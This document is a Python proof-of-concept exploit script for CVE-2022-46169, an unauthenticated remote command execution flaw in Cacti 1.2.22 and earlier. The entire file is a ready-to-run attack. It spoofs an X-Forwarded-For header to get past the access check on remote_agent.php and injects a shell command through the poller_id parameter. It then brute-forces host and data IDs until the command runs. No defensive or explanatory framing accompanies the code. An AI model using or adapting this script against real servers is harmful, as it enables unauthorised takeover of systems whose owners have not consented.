import requests
import argparse


class CVEExploit:
    def __init__(self, target, cmd, n_ids, n_localids):
        self.target = target
        self.cmd = cmd
        self.n_ids = n_ids
        self.n_localids = n_localids

    def run_exploit(self):
        payload = f'; /bin/sh -c "{self.cmd}"'
        local_data_ids = list(range(self.n_localids))
        target_ip = self.target.split("/")[2]

        print(f"[*] Trying for 1 - {self.n_ids} host ids")

        for host_id in range(self.n_ids):
            url = f'{self.target}/remote_agent.php'
            params = {
                'action': 'polldata',
                'host_id': host_id,
                'poller_id': payload,
                'local_data_ids[]': local_data_ids
            }
            headers = {'X-Forwarded-For': '127.0.0.1'}

            response = requests.get(url, params=params, headers=headers)
            if 'proc' in response.text:
                print(f"[+] Exploit Completed for host_id = {host_id}")
                break


def main():
    parser = argparse.ArgumentParser(
        prog='Poc of CVE-2022-46169',
        description='Unauthenticated RCE on Cacti <= 1.2.22',
        epilog='Author: antisec'
    )

    parser.add_argument('target', help='URL of the Cacti application.')

    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument('-f', type=argparse.FileType(), help='File containing the command', dest='file')
    group.add_argument('-c', help='Command', dest='cmd')

    parser.add_argument(
        '--n_host_ids', help='The range of host_ids to try (0 - n)', default=100, dest='n_ids', type=int
    )

    parser.add_argument(
        '--n_local_data_ids', help='The range of local_data_ids to try (0 - n)', default=50, dest='n_localids', type=int
    )

    args = parser.parse_args()

    if args.file:
        cmd = args.file.read().strip()
    elif args.cmd:
        cmd = args.cmd
    else:
        parser.print_help()
        exit(1)

    exploit = CVEExploit(args.target, cmd, args.n_ids, args.n_localids)
    exploit.run_exploit()


if __name__ == '__main__':
    main()
